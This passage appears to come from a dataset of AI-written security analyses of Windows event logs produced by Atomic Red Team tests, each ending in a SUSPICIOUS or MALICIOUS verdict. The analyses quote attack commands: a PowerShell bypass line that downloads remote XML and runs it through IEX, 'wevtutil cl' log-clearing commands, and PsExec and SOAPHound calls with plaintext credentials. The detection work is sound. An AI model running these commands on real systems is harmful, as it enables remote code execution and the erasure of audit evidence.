   - Clearing logs can be indicative of an attempt to cover tracks, typically associated with malicious behavior.

2. **Usage of Wevtutil**:
   - The command-line utility `wevtutil.exe` was used multiple times, which is legitimate for managing event logs but can also be misused to clear logs.
   - Specifically, the command line arguments `wevtutil.exe cl` followed by log names were used, which corresponds to clearing the logs.

3. **Unexpected CMD Execution**:
   - The `cmd.exe` was executed with the command `cmd /c echo Hello, from CMD!`, which doesn’t necessarily imply malicious intent, but its parent command includes string manipulations (`%LOCALAPPDATA:~-3,1%`) which might indicate an obfuscated command often used for malicious purposes.
  
4. **Time Change Events**:
   - Time changes were logged (Event ID 4616), which might be normal under certain circumstances, such as daylight saving adjustments or time synchronization. However, if conducted maliciously, it could be related to altering timestamps for records or logs.

5. **Use of Common System Utilities**:
   - System utilities like `hostname.exe`, `whoami.exe`, `cmd.exe`, and `conhost.exe` were executed under `SERVER002\admin_test`. While these are common utilities, their usage patterns together with log wiping should be reviewed for legitimacy.

6. **Sysmon Event IDs**:
   - The Sysmon logs show multiple Process Creation (Event ID: 1) and Process Termination (Event ID: 5) events that correspond to legitimate Windows operations and scheduled system tasks, such as Microsoft Edge updates. However, it is crucial to cross-reference these against known scheduled tasks to ensure they are expected.

### Assessment:
- Given the indications of log clearing by the same administrator account across multiple logs and the execution of utilities that can manipulate or wipe logs, along with potentially obfuscated command execution, the activity appears **SUSPICIOUS**.
  
### Guidance:
- Further Investigation: Review access logs and perform a deep forensic analysis on the `admin_test` account activities.
- Validate Legitimate Activities: Confirm with system administrators whether these actions were conducted as part of regular maintenance.
- Monitor and Audit: Implement enhanced monitoring for critical system utilities and enforce logging backup policies.
- Engage Threat Intel: Cross-reference digital signatures and hashes of these utility executions against threat intelligence databases to determine any known malicious usage.

### Resolution:
- **SUSPICIOUS**: The set of actions observed in the logs warrants a thorough investigation to rule out any malicious activity or confirm if activities were conducted by trusted personnel for legitimate purposes."
SOAPHound - Build Cache,"## Analysis of the Logs

### Indicators of Suspicious or Malicious Activity

1. **Log File Clearing:**
   - Several entries indicate the clearing of logs using the `wevtutil.exe` command. These are shown in the `System log` and `Sysmon log` with commands like:
     ```
     ""CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl System""
     ""CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Application""
     ""CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl \""Windows PowerShell\""""
     ```
   - Log clearing is typically an indication of attempts to cover tracks after malicious activities.

2. **PowerShell Execution with Suspicious Command:**
   - The `Windows PowerShell log` and `Sysmon log` entries show execution of:
     ```
     powershell.exe & {C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1059.001\\bin\\SOAPHound.exe --user $($env:USERNAME)@$($env:USERDOMAIN) --password P@ssword1 --dc 10.0.1.14 --buildcache --cachefilename c:\\temp\\cache.txt}
     ```
   - This command indicates an execution of a suspicious script SOAPHound.exe, which could be leveraging Active Directory or domain enumeration, evident by the `--user`, `--password`, and `--dc` parameters potentially targeting a domain controller.

3. **Security Log Clearing Event:**
   - The `Security log` indicates an event with ID `1102`, suggesting that the security log was cleared. This is suspicious, especially in combination with the other log clearing activities. 

4. **Process Execution Using High Integrity and NT AUTHORITY Account:**
   - Multiple Sysmon logs report processes executed by the `NT AUTHORITY\SYSTEM` user. Observations show heavy activity related to `Microsoft Edge Update` processes.
   - While these may indicate legitimate software update processes, the timing and volume, along with cleared logs, increase suspicion.

### Conclusion

Upon analyzing the logs, indicators of potential malicious activity are evident. Specifically, the clearing of logs combined with the execution of a suspicious PowerShell command suggests an attempt to conduct activities clandestinely. This behavior is notable for intrusion, data exfiltration, or further compromise attempts on the network.

### Recommendation
- **Resolution: MALICIOUS**

Given the evidence of log clearing and suspicious PowerShell command execution, this activity is assessed as malicious. Immediate steps include:
- Conducting a full forensic investigation into the host.
- Isolating the host from the network to prevent potential lateral movement or data exfiltration.
- Reviewing network traffic and other logs around the time of these events for further evidence of compromise or lateral movement.
- Alerting the incident response team and stakeholders about the potential breach.

It is crucial to determine the extent of the compromise and any data breaches that might have occurred. Steps should also be taken to patch vulnerabilities and tighten security controls to prevent similar activities in the future."
JScript execution to gather local computer information via wscript,"The provided log entries reveal several potentially suspicious activities that need to be addressed:

1. **Security Log:**
   - **Event ID 1102**: This event indicates that the security log was cleared by the user `admin_test`. This is a potential sign of malicious activity as clearing logs is often done to cover tracks.
   - **Frequent Event ID 4672**: Privilege assignments to `SYSTEM`, and particularly the presence of powerful system privileges such as `SeDebugPrivilege`, is normal for system processes. However, the escalation and excessive assignment of privileges should be validated against typical behavior for this user/computer.
   - **Event ID 4624**: Logon Type 5 (service logon) under SYSTEM context might indicate service-related operations; however, mass service logons paired with Event ID 4672 should be investigated for normalcy.
   - **Event ID 4798**: Numerous queries to retrieve information about group membership may suggest reconnaissance activity.

2. **System Log:**
   - **Events related to Updates and Process Creation**: The large volume of Windows Update-related events does not raise immediate alarm, but context is needed to ensure these updates are routine and expected.

3. **Sysmon Log:**
   - **Frequent Execution of `wevtutil.exe`**: Explicit command line for clearing event logs by `admin_test`, especially multiple instances interacting with different event log channels. This presents a clear indication of attempts to obfuscate actions.
   - **Unexpected Processes** such as `RUXIMICS.exe`, `CompatTelRunner.exe` executing frequently under SYSTEM account warrant evaluation for expected telemetry and potential exploit vectors.
   - **Process Tree Analysis**: Parent-child relationships involving sensitive processes (e.g., `taskhostw.exe`, `powershell.exe`) operating within system context should be scrutinized for unauthorized or suspicious utility use.

4. **Windows PowerShell Log:**
   - **PowerShell Invocations with Restricted Execution Policy**: Two commands run with PowerShell—checking file presence and the environment configuration—might indicate environmental reconnaissance or unauthorized configuration auditing.

5. **Application Log:**
   - **General Nature**: Logs concerning typical Edge updates and service stops are noted, but should be reviewed in sequence with system update logs to confirm they align with expected and planned tasks.

### Resolution:
The logs display behavior consistent with suspicious activity, particularly due to log clearance attempts and the execution of potentially malicious or unauthorized processes with high privilege. The actions by `admin_test` necessitate further investigation to determine intent and establish whether this activity was sanctioned or part of unusual operations.

Given the aforementioned evidence:
- **Resolution**: **SUSPICIOUS**

### Recommendations:
- Initiate a detailed review of `admin_test` actions to determine legitimacy.
- Correlate privilege assignments and clearances with scheduled tasks; check audit trails on administrative accounts.
- Verify if these PowerShell scripts align with an administrative or maintenance event.
- Perform a security audit on all devices within the domain to ascertain any unauthorized changes or intrusions.
- Investigate the purpose and context of all process executions, especially those under SYSTEM context.

Proceed with appropriate containment, remediation, and escalation procedures based on findings."
Create and Execute Batch Script,"Based on the provided Windows event logs, here is a detailed analysis focusing on suspicious or potentially malicious activities:

1. **Log File Clearing:**
   - The logs show multiple instances (Event ID 104) where the `admin_test` user account cleared the system logs, including the Windows PowerShell log (e.g., `wevtutil.exe cl System`, `wevtutil.exe cl ""Windows PowerShell""`). This behavior is typically suspicious as it might indicate an attempt to cover tracks after unauthorized activities.

2. **Suspicious PowerShell Activity:**
   - The PowerShell logs indicate execution of a script (`T1059.003_script.bat`) located in a path (`C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..`) often associated with temporary or staging directories that attackers may use (Event ID 600).
   - The manner in which PowerShell was invoked (`powershell.exe & {Start-Process ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\\ExternalPayloads\\T1059.003_script.bat""}`) is commonly seen in situations attempting to execute external payloads or scripts.

3. **Sysmon Logs Highlighting Process Creation:**
   - Process creation events show the execution of PowerShell with similar suspicious paths indicating execution of potentially harmful scripts.
   - Multiple instances of command-line tools like `whoami.exe` and `hostname.exe` being run could suggest reconnaissance activities.
   - There are instances of `cmd.exe` being used to run a script directly, which may be a sign of potentially harmful command execution, especially when tied to unknown or uncommon script files.

4. **Repeated Use of High-Integrity Processes:**
   - The Sysmon logs depict that the processes were run with high integrity levels which generally necessitates higher privileges, possibly indicating privilege escalation.

5. **Indicators of Persistence and Process Execution:**
   - There are Microsoft Edge Update processes initiated, likely legitimate but worth scrutiny in light of other events. These may represent normal update activity depending on how Edge is managed in the organization.

**Assessment:**
- The combination of cleared logs by an administrative account, suspicious path for script execution, and potential reconnaissance activities are indicative of potential compromise or malicious activities.

**Resolution:** 
- **MALICIOUS** - The activities observed are consistent with known attack patterns, particularly covering tracks through log clearance combined with suspicious script execution via PowerShell.

**Guidance on How to Proceed:**
- Immediately isolate the affected host (Server002) to prevent any further potential spread or damage.
- Conduct a forensic review to determine the full scope and impact of the incident, including identifying any additional compromised systems.
- Reset credentials for the affected accounts, especially `admin_test`, and consider enabling multi-factor authentication.
- Review firewall and network logs for any unusual outbound connections that may indicate data exfiltration.
- Update security policies and incident response plans to prevent similar occurrences.
- Educate users and administrators about recognizing and reporting suspicious activities promptly."
Execution through API - CreateProcess,"After thoroughly analyzing the provided Windows event logs, I have identified several elements that suggest suspicious activity:

1. **Log File Clearing:**
   - Multiple entries indicate the clearing of logs across several channels (System, Security, and Windows PowerShell) by the user `admin_test`. The log entries are as follows:
     - Event ID 104 (System log): Indicates the clearing of logs by `admin_test` in the System channel.
     - Event ID 104 (System log): Indicates the clearing of logs by `admin_test` in the Windows PowerShell channel.
     - Event ID 1102 (Security log): Indicates the clearing of logs by `admin_test` in the Security channel.
   
   Such activity is often associated with an attempt to cover tracks after potentially malicious actions have been executed. In a typical corporate environment, this type of activity would raise a red flag unless properly justified.

2. **Process Execution with Sysmon Logs:**
   - Multiple `wevtutil.exe` (Eventing Command Line Utility) processes were executed to clear logs from various channels:
     - Clearing logs from operational channels such as Sysmon and Security logs is suspicious, especially when executed under the same user context (`admin_test`).
   - The execution of these commands is captured sequentially, indicating a purposeful effort to expunge logs:
     - Example: ""wevtutil.exe cl Microsoft-Windows-Sysmon/Operational""
     - Example: ""wevtutil.exe cl Security""

3. **Unusual Command Execution:**
   - The execution of potentially malicious code:
     - Atomic Red Team simulation (noted as `AtomicRedTeam\\T1106`), representing adversarial simulation tools, was observed. Such frameworks are typically used to test security controls against known tactics, techniques, and procedures (TTPs).
   - Execution of C# compiler (`csc.exe`) to compile source code:
     - This can be part of system administration tasks but aligns with adversarial techniques (indicated by the Atomic Red Team reference).
   - Following the compilation, a suspicious executable `T1106.exe` was executed. This is consistent with TTPs for executing malicious code.
   - Command execution included unnecessary application launches (e.g., Calculator, noted as `calc.exe`), which may serve as a false flag or test execution.

4. **Frequent Use of Command-Line Utilities:**
   - The frequent use of `cmd.exe` and execution of scripts/classes suggests scripting or programmatic interaction, which, without valid context, can be concerning.

**Resolution: SUSPICIOUS**

### Assessment:
- The events indicate deliberate clearing of event logs, usage of command-line utilities likely for anomalous script execution, along with the generation and execution of dynamically compiled binaries from potentially suspicious sources.

### Guidance:
- **Immediate Actions:**
  - Conduct a review of user activity for `admin_test` to verify their actions and any potential role in legitimate test frameworks.
  - Check for justifications for cleared logs and evaluate any corroborative evidence for legitimate administrative purposes.
  - Review system settings for any changes in logging configurations to ensure log integrity and availability.
  - Isolate the affected host (Server002) for further forensic analysis, including recovery of deleted logs and file system analysis.
  
- **Long-term Recommendations:**
  - Strengthen monitoring of log-clearing actions and suspicious command execution with instant alerts.
  - Implement tighter access controls and just-in-time access for administrative actions.
  - Educate users on recognizing and reporting suspicious behavior, especially after demonstrative testing or simulations.
  - Conduct a thorough review of Security Information and Event Management (SIEM) policies to capture pertinent anomalies and escalate them efficiently."
Run Shellcode via Syscall in Go,"Based on the analysis of the provided Windows event logs, several indicators suggest potential malicious activity on the host ""Server002"". The key observations and concerns are as follows:

1. **Process Execution Insight**: 
   - The Sysmon logs detail a series of executions primarily involving `wevtutil.exe` and `conhost.exe`, which are not typically associated with routine administration tasks in such rapid succession without corresponding administrative context.
   - The execution of `wevtutil.exe` with command-line arguments like `""cl Application""`, `""cl System""`, `""cl Security""`, and `""cl Windows PowerShell""` suggests Event Log clearing activity, which is a common tactic used by adversaries to cover their tracks. 

2. **Log Cleared Events**:
   - The Security and System logs indicate events where logs were cleared. Specifically:
     - Event ID 1102 in the Security Log indicates the Security Log was cleared by the user ""admin_test"".
     - Event ID 104 in the System Log indicates the System and PowerShell event logs were cleared. The clearing of logs is a red flag for potential malicious behavior aiming to obfuscate activities.

3. **PowerShell Execution**:
   - A PowerShell script was executed (`powershell.exe & {C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1106\\bin\\x64\\syscall.exe -debug}`). This entry appears suspicious due to the involvement of a `syscall.exe` from a temporary path, which could be associated with known malicious tools or scripts, or penetration testing frameworks, such as Atomic Red Team techniques, indicating simulation of an attack or testing of malicious capabilities.

4. **Anomalous Command Usage**:
   - The use of `hostname.exe` and `whoami.exe` immediately after PowerShell execution might indicate reconnaissance activity on the host, usually performed after compromising a system to understand the environment better or test the level of access gained.

5. **User Context**:
   - All suspicious activities seem to be executed under the context of the user ""admin_test"" with administrative privileges (`IntegrityLevel: High`), which is critical because such users have the capability to potentially escalate privileges and carry out further compromise actions.

### Assessment:

The logs depict a sequence of events that align with the Tactics, Techniques, and Procedures (TTPs) commonly associated with malicious activities, particularly:
- Clearing of Event Logs to hide evidence of actions taken.
- Use of tools likely linked to testing or malicious activities executed through PowerShell.

### Resolution:

- **MALICIOUS**: The logs contain sufficient indicators of potentially malicious activity, such as log tampering, execution of potentially unsafe scripts from temporary paths, and suspicious use of administrative utilities. Immediate further investigation is required.

### Guidance:

1. **Further Investigation**:
   - Conduct a deeper forensic analysis of the host to determine how the `admin_test` account was used and detect any unauthorized access or command and control communications.
   - Examine other related systems for similar behaviors, especially if they share administrative users.

2. **Containment and Remediation**:
   - Consider isolating ""Server002"" until a full assessment is completed and cleared for compliance with security policies.
   - Reset credentials for the ""admin_test"" account and review user access policies.
   - Ensure logging configurations meet best practices to prevent unauthorized clearing without proper oversight.

3. **Monitoring and Detection**:
   - Increase monitoring on sensitive accounts and their command history.
   - Implement detection rules for suspicious tool usage and log clearing activities.
   
Immediate action is warranted based on current findings to safeguard against further potential exposure or damage."
Powershell XML requests,"### Detailed Analysis of Windows Event Logs

**Suspicious or Anomalous Behavior Identified:**

1. **Event Log Clearing:**  
   - Multiple event logs, including the Sysmon Operational, Security, System, and Windows PowerShell event logs, were cleared in a very short timeframe, as indicated by Event ID 1102 in the Security log and Event ID 104 in the System log.
   - The clearing of logs is executed by the user `admin_test` from the system `SERVER002`, using processes `wevtutil.exe` with high integrity. This tool (`wevtutil.exe`) is a legitimate utility for managing event logs but its usage in this context (to clear logs) is indicative of attempts to cover up illicit activity.

2. **Unusual Process Executions:**
   - There was an execution of `cmd.exe` with suspicious command-line arguments. The command executed a PowerShell script in bypass mode, loading an XML file from an external URL (`raw.githubusercontent.com`) and executing its contents. This is indicative of potentially malicious behavior:
     ```plaintext
     ""cmd.exe"" /c ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" -exec bypass -noprofile ""$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX""
     ```

3. **Privileged Account Usage:**
   - The user `admin_test` logged in with an elevated token and high privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others, allowing significant control over the system which could be abused for malicious purposes.

4. **High Rate of Process Execution:** 
   - A series of processes, including `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`, were executed consecutively in a short time frame. Such rapid and sequential execution without clear justification could suggest automated scripts or commands designed to enumerate and potentially exfiltrate data, or prepare the environment for further compromise.

**Indication of Malicious Activity or Compromise:**
- The combination of event log clearing, suspicious PowerShell scripting, and use of high privileges are classic indicators of an attacker trying to conduct operations stealthily while maintaining administrative control over the system.

### Assessment and Resolution

- **Threat/Risk Identified:**
  - The logs provide several indications of malicious activity, particularly the clearing of event logs, execution of a potentially malicious PowerShell script from an external source, and use of high-privilege operations consistent with advanced tactics, techniques, and procedures (TTPs) observed in actual cyber incidents.

### Resolution: MALICIOUS

**Guidance on How to Proceed:**
1. **Immediate response actions:**
   - Isolate `Server002` to prevent potential lateral movement or further malicious activity on the network.
   - Reset credentials for `admin_test` and other privileged accounts to prevent any unauthorized access.
   - Conduct a full forensic investigation of `Server002` to identify the extent of the compromise and any data exfiltration.
   - Capture memory and disk images for detailed analysis of any malware or scripts that may be residing on the system.

2. **Enhanced Monitoring and Logging:**
   - Re-enable detailed logging and monitoring across the network.
   - Implement logging alerts for similar command-line executions and log clearances.

3. **Security Policy Review:**
   - Review and update security policies regarding privileged access and the use of tools like `wevtutil.exe`.
   - Enhance employee training on recognizing and reporting suspicious activity.

This assessment concludes that the logs indeed contain clear signs of malicious activity and immediate security measures are required to contain the threat, analyze the intrusion, and prevent future occurrences."

PowerShell Command Execution,"Upon reviewing the provided Windows event logs, several indicators suggest potentially suspicious or malicious activity on the host, particularly due to interactions with system utilities and the specific command execution patterns observed.

### Detailed Analysis:

#### 1. PowerShell Events:
- **PowerShell Encoded Command**: There are multiple instances where PowerShell is executed with encoded commands (`-e JgAgACgAZw...`). Encoded PowerShell commands often indicate obfuscation, commonly used in attacks to hide malicious scripts.
- **Non-standard Usage**: The PowerShell instance using `-e` flag for base64 encoded commands does not seem typical for routine or benign operations and warrants further investigation.

#### 2. Security & System Logs:
- **Event Logs Cleared**: The Security event log ID 1102 and System log ID 104 indicate that logs were cleared by the user `admin_test`. Clearing of event logs is a key indicator of potential malicious intent, as it is commonly done to cover tracks.
- **Time Changes and Synchronization**: Although changes to system time and synchronization can occasionally occur for legitimate reasons, they are sometimes used by attackers to evade detections tied to timing.

#### 3. Sysmon Logs:
- **Wevtutil Usage**: Multiple uses of `wevtutil.exe` with `cl` command to clear logs (`CommandLine=""\""C:\\Windows\\system32\\wevtutil.exe\"" cl <log name>""`) were observed. This aligns with activities intended to cover tracks by clearing logs.
- **Execution of `cmd.exe` with Encoded PowerShell**: Further confirms suspicious processes executing potentially obfuscated scripts, reinforcing suspicion of malicious activity.
- **`whoami.exe` and `hostname.exe` executions**: While legitimate utilities, their execution pattern, interspersed with encoded malicious commands, can be part of reconnaissance activities by attackers.

### Assessment:
The accumulation of the PowerShell encoded commands, the log clearing actions, and the execution of system utilities in the observed pattern indicates behaviors associated with potential threat actors attempting to execute unauthorized activities and cover their tracks.

### Resolution:
**MALICIOUS**

### Guidance:
1. **Immediate Actions**:
   - Isolate the affected host to prevent further lateral movement.
   - Preserve the host in its current state for forensic analysis to understand the full scope of compromise.
   - Verify integrity of other hosts and networks the affected system connected to.

2. **Further Investigation**:
   - Retrieve and decode the base64 PowerShell commands to comprehend the executed scripts' intentions and functions.
   - Correlate these events with any other suspicious activities in network logs or alerts.
   - Review user account and privilege usage, particularly focusing on `admin_test`.

3. **Long-term Actions**:
   - Assess and enhance monitoring and alerting systems for similar encoded command execution patterns.
   - Employ strict access control measures and auditing policies to deter unauthorized use of administrative accounts.
   - Provide security awareness training focusing on signs of compromise and safe practices for system administrators.

This assessment and guidance should help manage the incident effectively and mitigate future risks."
Use PsExec to execute a command on a remote host,"Upon reviewing the logs provided, several indicators of potentially suspicious and malicious activity stand out:

1. **Frequent Execution of `wevtutil.exe`:**
   - There are multiple events showing the execution of `wevtutil.exe` with the command to clear logs (`cl`) across different channels such as Sysmon, Application, and Security (record IDs: 17966, 17970, 17974, 17982, 17986, etc.). This action is highly suspicious as it can often indicate log tampering to hide tracks of malicious activity.

2. **Log Clearing Events:**
   - The security and system logs both show log clearing events (EventID 1102 and 104 respectively). This was performed by the same user (`admin_test`) on `SERVER002`, which aligns with the activities observed around the `wevtutil.exe` usage. Clearing of event logs is a common tactic used by attackers to cover their trail after compromising a system.

3. **Suspicious Execution via `cmd.exe`:**
   - There is a command executed under `cmd.exe` that uses `PsExec.exe` with administrator credentials (username `DOMAIN\\Administrator`) and a plaintext password (`P@ssw0rd1`) to launch the calculator (`calc.exe`). This event (Record ID 17995) is highly indicative of malicious activity because it involves password usage in a command line and execution of a process potentially without user consent.

4. **Processes with High Privilege Level:**
   - Significant activities are executed under high integrity levels, particularly the execution of `wevtutil.exe` and `cmd.exe`, suggesting actions were performed with elevated privileges. This is concerning, especially when correlated with the task to clear logs.

5. **Absence of Parent Information in Some Instances:**
   - Certain processes, especially involving `MicrosoftEdgeUpdate.exe`, have entries where the parent process information is default or missing. While this may be related to normal operations, within the context of other suspicious activities, it is worth noting.

### Assessment:
The behavior present in these logs suggests evidence of potential malicious activity:
- Use of event log clearing to potentially cover tracks.
- Execution of commands using administrator credentials in an insecure manner.
- A pattern of activity suggesting attempts to maintain persistence or perform unauthorized actions.
 
Based on the evidence reviewed, I would classify this situation as:
**MALICIOUS**.

### Recommended Actions:
- **Immediate Investigation:**
  - Examine all systems for evidence of unauthorized access, especially those related to the `admin_test` user.
  - Cross-reference these activities with network logs to identify potential connections to external IPs or unauthorized data exfiltration attempts.

- **Credential Audit:**
  - Change all credentials used, especially those for administrative accounts.
  - Review and possibly update policies regarding the handling of credentials and elevation of privileges.

- **Forensic Analysis:**
  - Perform a comprehensive forensic analysis on `Server002` to identify potentially compromised files, malware, or backdoors.
  - Investigate the origins of the suspicious commands and processes, including the source of `PsExec.exe`.

- **Security Posture Review:**
  - Implement improved monitoring with alerts for similar suspicious patterns.
  - Enforce logging policies to prevent unauthorized log clearing, and secure important security logs to prevent tampering.

Maintain vigilance and enhance endpoint detection to counteract similar future attempts at intrusion or compromise."
ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments,"### Log Analysis

From the detailed analysis of the log events provided, several points of interest and potential indicators of malicious activity were identified.

#### PowerShell Logs
1. **Encoded PowerShell Commands**:
   - There is repeated execution of PowerShell using encoded arguments (`-UseEncodedArguments -EncodedArgumentsParamVariation EA`) around `2024-10-23 11:33:49`. This use of encoded scripts can often signify attempts to obfuscate activity, potentially indicative of malicious behavior. The specific command is:

     ```
     powershell.exe & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop}
     ```

2. **Restricted Execution Policy**:
   - A PowerShell command with `ExecutionPolicy Restricted` is seen, which is uncommon for scripts. This limits script execution and may indicate tampering to execute unauthorized content:

     ```
     powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\\inf\\*.inf'); [...]""
     ```

#### System Logs
1. **Log File Clearing**:
   - The system, PowerShell, and Security logs were cleared by an account `admin_test`. Clearing event logs is a red flag as it can be a sign of attempting to hide tracks after some activity:
     - System log cleared at `2024-10-23 11:33:48.7234680`.
     - PowerShell log cleared at `2024-10-23 11:33:48.9243866`.
     - Security log cleared at `2024-10-23 11:33:48.8060310`.

#### Security Logs
1. **Logon Activity**:
   - There are records for a successful logon session (Event ID 4624) using privileged system credentials, `SubjectUserSid`: S-1-5-18 (System account) which themselves are not highly suspicious but should be correlated with concurrent events for ensuring they are legitimate access.

2. **Privileges and Credential Failure**:
   - Privilege escalation with high privileges like `SeDebugPrivilege` was noted (Event ID 4672).
   - Multiple credential failures with ReturnCode: `3221226021`, indicating failed login attempts possibly relating to malicious activity or misconfiguration.

#### Sysmon Logs
1. **Persistent Execution**:
   - Several executions of `wevtutil.exe` for log clearing have been logged. This is likely tied to attempts to delete or hide logs from various channels. Such actions point towards attempts to cover up actions:
     - For System, Security, and Application logs.

2. **Use of Utilities**:
   - Utilities like `whoami.exe`, `HOSTNAME.EXE`, `taskhostw.exe` were executed. While normal, in the context of other suspicious activity, they can be associated with script-based reconnaissance or attempts to gather system information.

### Overall Assessment
- **Encoded PowerShell commands**, **log clearance**, and **use of utilities with potentially malicious purposes** are strong indicators of suspicious behavior.

### Conclusion
Given the combination of suspicious PowerShell executions, evidence of event log clearance, and potentially malicious system activities and commands, the activity observed in the logs can be categorized as:

**Resolution: MALICIOUS**

### Recommendations
1. **Isolate the host** to prevent any further possible malicious activity and lateral movement.
2. **Conduct forensic analysis** on the host to extract any malicious scripts, tools, or backdoors that may have been executed.
3. **Review and change credentials** used during the timeline of these events, especially the `admin_test` account, as they may have been compromised.
4. **Increase monitoring** and alerting on similar activities across the environment.
5. **Implement a stronger logging policy** and review the retention settings to ensure past logs are accessible for future investigations.

These measures can help to contain the threat and prevent further compromise or data exfiltration."
Cobalt Strike SSH (postex_ssh) pipe,"Based on the analysis of the provided logs, I have identified several indicators that suggest suspicious and potentially malicious activity:

1. **Clearing of Event Logs**: The Sysmon log shows multiple `wevtutil.exe` commands with `cl` argument which are used to clear event logs. Specifically, we see different event logs being cleared (`Security`, `System`, `Application`, `Microsoft-Windows-Sysmon/Operational`, and `Windows PowerShell`). This action is typically associated with attempts to cover up traces of malicious activities.

2. **Process Execution in Temp Directory**: The execution of a binary (`namedpipes_executor.exe`) from a temporary directory and its associated payloads (`namedpipes_client.exe` and `namedpipes_server.exe`) are noted alongside the `cmd.exe` launching it. The directory `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\` is often used by malware to avoid detection and facilitates command and control activities.

3. **Suspicious Command Line Activity**: The use of `cmd.exe` for executing scripts and binaries from unconventional paths such as the Temp directory points to potential unauthorized or malicious script execution.

4. **Use of Processes like `PowerShell.exe` and `conhost.exe`**: Often used in legitimate operations, these processes can be leveraged for malicious purposes, especially when used in conjunction with other indicators like log clearing and unexpected network activity.

5. **Security Events**: Security logs highlight successful credential enumeration events (ID 4798). While these could be benign, in this context, they align with potential reconnaissance activities often seen in lateral movement phases of attacks.

6. **Elevation of Privileges**: There are numerous events marking the use of highly privileged tokens (ID 4672) without clear corresponding legitimate administrative tasks.

Given these observations, the logs show significant signs of suspicious behavior, primarily focusing on the clearing of event logs potentially to hide malicious activities, and process execution patterns indicative of malicious intent.

**Assessment: SUSPICIOUS**

**Guidance on Proceeding:**
- Immediately isolate the system (Server002) to prevent any potential spread or further compromise within the network.
- Conduct a comprehensive forensic investigation on the compromised host, focusing on the origin of the `namedpipes*` binaries and any unauthorized script or code execution.
- Review and tighten access controls, especially scrutinizing any administrative accounts such as `admin_test`.
- Refresh security logs collection strategy to prevent or detect tampering.
- Increase monitoring and alerting around similar behaviors in the network or on other hosts. 

Based on the outcome of the investigation, further actions such as a broader incident response initiative or legal reporting may be necessary."
WMI Reconnaissance Processes,"Upon analyzing the provided Windows event logs, the following key observations were made:

1. **Sysmon Logs:**
   - A pattern of utility executions, specifically `whoami.exe`, `wevtutil.exe`, `conhost.exe`, and `wbem\\WMIC.exe`, is evident in the logs. While these are legitimate Windows utilities, their execution sequence and context may indicate an investigation for reconnaissance or log clearing activities.
   - The `wevtutil.exe` was used with the `cl` (clear) option across various logs (Security, Sysmon, Application, Windows PowerShell). This is unusual activity and often associated with attempts to cover tracks by clearing log records.
   - The timing of these executions is closely related, suggesting a possible automated or scripted sequence aimed at clearing logs in a methodical manner.

2. **Security and System Logs:**
   - The Security log shows an event ID 1102, which explicitly states that audit logs have been cleared. This is a critical indicator of potentially malicious activity, as attackers often clear logs to erase their tracks.
   - System logs indicate that admin_test cleared the System and Windows PowerShell logs. Clearing PowerShell logs, in particular, is considered highly suspicious due to PowerShell's use in remote administration and scripting attacks.

3. **Application Logs:**
   - The presence of Software Protection Platform Service logs does not immediately suggest suspicious behavior; however, given the context of other logs, it might be worth understanding if these were tampered with in any way.

4. **Indicators of Malicious Activity:**
   - The combination of legitimate command-line tools used in a potentially orchestrated manner to gather information and clear logs is suggestive of a threat actor's attempt to obfuscate their presence on the system.
   - The clearing of logs is a well-known tactic in intrusion activities to hide malicious steps from system administrators.

**Assessment:**
The logs reveal anomalies that collectively indicate a likely compromise, particularly surrounding activities to clear logs and potentially perform reconnaissance. Given the nature of these activities, this scenario can reasonably be classified as 'MALICIOUS'.

**Guidance on How to Proceed:**
- Immediate containment actions should be undertaken to ensure no further damage occurs. This may include isolating the affected system from the network.
- Conduct a thorough investigation to identify how the attacker gained access and what other actions they might have undertaken.
- Restore logs from backups if possible and implement enhanced logging mechanisms.
- Review and improve security measures to prevent future incidents, such as stricter access controls, continuous monitoring, and incident response planning.
- If an automated script was used, analyze and track any script remnants or malware on the system.
- Notify relevant stakeholders and potentially affected parties, depending on company policies and legal obligations."
Writes text to a file and displays it,"Upon analyzing the provided logs, several observations and events stand out, indicating suspected malicious activity. Here’s a detailed analysis of the log entries:

1. **Sysmon Logs:**
   - **wevtutil.exe Execution:** Multiple instances of `wevtutil.exe` are executed by the user `SERVER002\admin_test`. The `wevtutil` command is commonly used in event log management, including clearing event logs. In this context, the use of `wevtutil` to clear logs (as seen in command lines like `\""C:\\Windows\\system32\\wevtutil.exe\"" cl Security`) suggests an attempt to cover tracks, a common tactic used by attackers.
   - **Process Chain:** There is a pattern where `wevtutil.exe` and `conhost.exe` are executed sequentially. The parent process for these executions is `wsmprovhost.exe` which is legitimate but used here as a launching base for potentially malicious activities.
   
2. **System and Security Logs:**
   - **Log Clear Events:** Event ID 104 recorded multiple times in the system log indicates the event logs are being cleared by the `admin_test` account. Similarly, Security log Event ID 1102 shows the security logs being cleared by the same user account. Log clearing is another strong indicator of malicious activity as this can be a sign of an attacker trying to erase their activities.
   - **Elevated Privileges:** The security log shows Event ID 4672, indicating the account `admin_test` has been granted special privileges including `SeDebugPrivilege` which can allow processes to debug other processes. This is not common operational behavior and can indicate privilege misuse.
   
3. **Execution of Commands:**
   - **CMD Execution:** There is an execution of `cmd.exe` with a command to echo a message and manipulate a temporary file (`""cmd.exe"" /c echo ""Hello from the Windows Command Prompt!"" > ""%TEMP%\\test.bin"" & type ""%TEMP%\\test.bin""`). Though the command itself is benign, its presence amidst other suspicious events can suggest tests or further exploration by an unauthorized user.

4. **Legitimate System Processes:**
